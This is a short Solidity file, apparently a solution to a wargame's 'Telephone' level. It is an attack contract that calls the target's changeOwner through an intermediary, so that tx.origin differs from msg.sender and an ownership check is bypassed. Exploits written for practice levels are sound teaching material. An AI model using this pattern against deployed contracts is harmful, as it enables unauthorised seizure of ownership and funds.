// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "../levels/Telephone.sol";

contract TelephoneAttack {
    Telephone public telephone;

    constructor(address _telephoneAddress) {
	telephone = Telephone(_telephoneAddress);
    }

    function attack() public {
	telephone.changeOwner(msg.sender);
    }
}
